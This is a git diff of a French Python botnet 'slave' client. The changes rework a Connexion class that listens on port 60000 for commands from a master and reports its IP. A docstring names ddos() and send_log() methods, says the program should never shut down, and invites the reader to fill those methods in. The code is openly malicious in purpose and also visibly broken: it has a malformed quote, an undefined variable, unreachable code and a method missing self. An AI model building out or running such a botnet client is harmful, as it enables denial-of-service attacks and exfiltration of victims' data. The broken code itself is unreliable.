@@ -20,27 +20,39 @@ le programme ne s'éteigne jamais, et puisse recommencer à communiquer avec le 
 ddos() ..................
 send_log() ..............
 fais ce qui te plais avec les 2 methodes au dessus a toi de t'amuser :D
-"""
+""""
 
-class Communication():
-    
-    def __init__(self, machineMaitre, slaveListen, slaveListen2):
+class Connexion():
+    # création de l'objet connexion avec le champ machineMaitre
+    def __init__(self, machineMaitre, socket, listeAdresseIP):
         self.machineMaitre = machineMaitre
-        self.slaveListen = slaveListen
-        self.slaveListen2 = slaveListen2
-        
-    def ecoute(self, slaveListen):
-        slaveListen2.bind(("localhost", 60000))
-        slaveListen2.listen()
-        print("Je suis maintenant en écoute")
-        distantSocket, addr = slaveListen2.accept()
-        return distantSocket.recv(1024)
+        self.socket = socket
+        self.listeAdresseIP = listeAdresseIP
 
-    def connexion(self, machineMaitre, slaveListen):
+    #1er étape, mettre en place un canal de communication pour recevoir les messages du master
+    def listen(self):
+        # adresse du master
+        master_addr = ("localhost", 60000)
+        # création du socket pour que le slave écoute sur un port afin de récupérer les instructions du master
+        socket_listen = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
+        # écoute sur toutes l'adresse du slave et sur le port 60 000
+        socket_listen.bind(master_addr)
+        # une fois connecté, on le met en écoute et on accepte la connexion afin qu'il reçoive les instruction du master
+        slave_listen.listen()
+        distant_socket, addr = slave_listen.accept()
+        return distant_socket.recv(1024).decode("utf-8")
+        return socket_listen
+
+    # 2è étape, mettre en place un canal de communication pour envoyer des messages au master
+    def sendIP():
+        # adresse du master
+        master_addr = ("localhost", 60000)
+        # création du socket pour que le master envoie des messages au slave
+        sendIP = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
         # on définit les coordonnées sur lesquelles le slave va envoyer son adresse ip
-        slaveListen.connect(machineMaitre)
-        slaveListen.send("192.168.1.1".encode("utf-8"))
+        sendIP.connect(master_addr)
         print("IP envoyée au master")
+
 
 class Action():
 
